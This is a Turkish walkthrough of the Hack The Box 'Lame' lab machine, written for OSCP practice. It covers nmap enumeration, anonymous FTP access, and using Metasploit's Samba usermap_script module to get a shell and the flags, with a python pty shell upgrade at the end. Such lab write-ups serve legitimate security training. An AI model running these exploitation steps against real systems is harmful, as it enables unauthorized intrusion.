# OSCP_Preparation

Makine IP: 10.129.86.76 

 Hemen nmap çalıştırıyorum ve bizi neler bekliyor görmek için sabırsızlanıyorum.

```console
Nmap -A 10.129.86.76  

Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-23 19:04 +03 

Nmap scan report for 10.129.86.76 (10.129.86.76) 

Host is up (0.062s latency). 

Not shown: 996 filtered ports 

PORT    STATE SERVICE     VERSION 

21/tcp  open  ftp         vsftpd 2.3.4 

|_ftp-anon: Anonymous FTP login allowed (FTP code 230) 

| ftp-syst:  

|   STAT:  

| FTP server status: 

|      Connected to 10.10.14.85 

|      Logged in as ftp 

|      TYPE: ASCII 

|      No session bandwidth limit 

|      Session timeout in seconds is 300 

|      Control connection is plain text 

|      Data connections will be plain text 

|      vsFTPd 2.3.4 - secure, fast, stable 

|_End of status 

22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 

| ssh-hostkey:  

|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) 

|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 

445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 

Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%) 

No exact OS matches for host (test conditions non-ideal). 

Network Distance: 2 hops 

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 

  

Host script results: 

|_clock-skew: mean: 2h30m39s, deviation: 3h32m11s, median: 36s 

| smb-os-discovery:  

|   OS: Unix (Samba 3.0.20-Debian) 

|   Computer name: lame 

|   NetBIOS computer name:  

|   Domain name: hackthebox.gr 

|   FQDN: lame.hackthebox.gr 

|_  System time: 2021-01-23T11:05:25-05:00 

| smb-security-mode:  

|   account_used: guest 

|   authentication_level: user 

|   challenge_response: supported 

|_  message_signing: disabled (dangerous, but default) 

|_smb2-time: Protocol negotiation failed (SMB2) 

  

TRACEROUTE (using port 21/tcp) 

HOP RTT      ADDRESS 

1   62.37 ms 10.10.14.1 (10.10.14.1) 

2   62.53 ms 10.129.86.76 (10.129.86.76) 

  

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 

Nmap done: 1 IP address (1 host up) scanned in 163.15 seconds 
```
 

 
FTP’den girmeyi denedim. 
```console
tcp> open 

(to) 10.129.86.76  

Connected to 10.129.86.76. 

220 (vsFTPd 2.3.4) 

Name (10.129.86.76:naoumine): anonymous 

331 Please specify the password. 

Password: 

230 Login successful. 

Remote system type is UNIX. 

Using binary mode to transfer files. 

ftp> ls 

200 PORT command successful. Consider using PASV. 

150 Here comes the directory listing. 

226 Directory send OK. 

ftp> passive 

Passive mode on. 

ftp> cd /home 

550 Failed to change directory. 

```
 

PASV FTP, Dosya Aktarım Protokolü (FTP) bağlantılarını kurmak için alternatif bir moddur. Kısacası, bir FTP istemcisinin gelen bağlantılarını engelleyen güvenlik duvarı sorununu çözmektedir. Pasif FTP, bir güvenlik duvarının arkasındaki FTP istemcileri için tercih edilen bir FTP modudur. 

 

https://www.exploit-db.com/exploits/17491 - Bu versiyonda Command Execution açığı olduğu görülüyor. 

 
Ftp'den devam edemediğim için samba da ilgili versiyonda açık olup olmadığına bakıyorum. 
 

 
```console
msf6 > search samba 3.0.20 
```

![image](C:\Users\90532\Documents\OSCP_github\OSCP_Preparation\Assets\1.PNG)

Command Execution açıklığı olduğunu gördükten sonra exploitimi hazırlamaya başlıyorum.

  
```console
msf6 > use exploit/multi/samba/usermap_script 
```

![image](C:\Users\90532\Documents\OSCP_github\OSCP_Preparation\Assets\2.PNG)

 
```console
msf6 exploit(multi/samba/usermap_script) > set RPORT 445 
```
 Burada dikkat edilmesi gereken kısım port. Nmap ile elde ettiğimiz sonucu unutmadan devam ediyoruz.

Ve en sevilen kısım EXPLOİT ! Enter..
```console
msf6 exploit(multi/samba/usermap_script) > exploit 
```
![image](C:\Users\90532\Documents\OSCP_github\OSCP_Preparation\Assets\3.PNG)

Başarılı olduk. Şimdi TTY shell alalım işimiz kolay olsun.
  
```console
python -c 'import pty; pty.spawn("/bin/sh")' 
```

![image](C:\Users\90532\Documents\OSCP_github\OSCP_Preparation\Assets\4.PNG)


Hem user hem root flag'ini almış bulunuyoruz :)
 

 

 

